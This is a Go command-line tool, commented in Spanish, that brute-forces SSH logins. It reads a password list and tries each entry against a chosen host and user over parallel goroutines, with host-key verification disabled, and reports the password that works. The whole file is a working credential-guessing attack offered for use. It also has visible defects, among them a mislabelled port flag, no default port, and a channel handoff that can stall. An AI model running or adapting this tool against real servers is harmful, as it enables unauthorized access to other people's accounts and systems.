package main

import (
	"bufio"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"os"
	"sync"
	"time"
)

func main() {

	//cmdline para entrada de informacion
	file_pass := flag.String("f", "", "Archivo con el listado de contreñas a probar.")
	ssh_host := flag.String("h", "", "Servidor SSH destino.")
	ssh_user := flag.String("u", "", "Usuario SSH destino.")
	ssh_port := flag.String("p", "", "Usuario SSH destino.")
	maxtreads := flag.Int("t", 4, "Maximo de Treads.")
	flag.Parse()

	if *file_pass == "" || *ssh_host == "" || *ssh_user == "" {
		fmt.Printf("%s\n\n", "Error: Opcion invalida o sin parametros.")
		flag.PrintDefaults()
		log.Fatalf("Bye!")
	}

	starttime := time.Now()
	defer func() {
		elapsed := time.Since(starttime)
		fmt.Printf("Tiempo tomado: %s", elapsed)
	}()

	//crear canal de informacion
	datos := make(chan string)
	okpassw := make(chan string)
	var foundpassw string

	//crear MAX_THREADS goroutinas:
	ws := sync.WaitGroup{}
	ws.Add(*maxtreads)
	for ii := 0; ii < *maxtreads; ii++ {
		go func(x int) {
			defer ws.Done()
			log.Println("Iniciando thread nro: ", x)

			for input := range datos {

				sshConfig := &ssh.ClientConfig{
					User: *ssh_user,
					Auth: []ssh.AuthMethod{
						ssh.Password(input),
					},
					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				}

				serverssh := *ssh_host + ":" + *ssh_port

				connection, err := ssh.Dial("tcp", serverssh, sshConfig)
				if err != nil {
					//Si falla la conexion es porque no es valido la autenticacion
					//o el servidor ssh tiene algun tipo de control ;)
					//log.Println("Failed to dial: %s", err)
					continue
				} else {
					//Eureka!!
					okpassw <- input
				}

				connection.Close()

			} //for datos
		}(ii) //go func
	} //for ii

	//Abro archivo:
	f, err := os.Open(*file_pass)
	if err != nil {
		log.Fatalln("El archivo de contraseñas no se encuentra.", err)
	}
	defer f.Close()

	//Envio cada password a traves del canal:
	s := bufio.NewScanner(f)
	for s.Scan() && foundpassw == "" {
		datos <- s.Text()

		select {
		case foundpassw = <-okpassw:
			break
		default:
			continue
		}

	}
	close(datos)

	ws.Wait()

	if foundpassw != "" {
		log.Println("Password encontrado: ", foundpassw)
	} else {
		log.Println("Password NO encontrado.")
	}

}
